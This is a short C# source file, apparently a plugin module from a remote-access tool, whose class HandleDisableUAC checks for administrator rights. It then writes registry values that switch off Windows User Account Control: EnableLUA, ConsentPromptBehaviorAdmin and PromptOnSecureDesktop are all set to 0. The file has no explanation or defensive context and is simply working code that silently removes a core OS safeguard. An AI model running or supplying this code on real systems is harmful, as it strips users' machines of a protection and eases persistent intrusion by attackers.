using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Plugin.Handler
{
    class HandleDisableUAC
    {
        RegistryKey RegKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        int value;
        public void Run()
        {
            Debug.WriteLine("Plugin Invoked");
            if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

            RegKey.SetValue("consentpromptbehavioradmin", "0", RegistryValueKind.DWord);
            RegKey.SetValue("enablelua", "0", RegistryValueKind.DWord);
            RegKey.SetValue("promptonsecuredesktop", "0", RegistryValueKind.DWord);
            value = (int)RegKey.GetValue("enablelua", null);
            RegKey.Close();
        }
    }
}
